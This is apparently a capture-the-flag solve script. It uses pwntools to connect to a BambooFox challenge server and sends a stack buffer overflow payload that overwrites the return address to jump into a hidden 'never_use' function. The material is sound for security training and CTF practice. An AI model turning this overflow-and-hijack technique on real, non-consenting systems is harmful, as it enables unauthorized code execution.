#!/usr/bin/env python3

from pwn import *

r = remote(host="bamboofox.cs.nctu.edu.tw", port=10000)


# Return-to-Oriented Porgramming (ROP) Exploit here
ret = r.recvuntil("Give me your name(a-z): ")
print(ret)

r.sendline(b"hihi")

ret = r.recvuntil("Give me something that you want to MAGIC: ")
print(ret)

# Buffer size is actually 68, not 60
# Using GDB with binary file, disas the never_use function to get address 0x0804860d
data = b"\x00AAA" + b"AAAA"*16 + b"BBBB" + b"\x0e\x86\x04\x08"
r.sendline(data)

r.interactive()
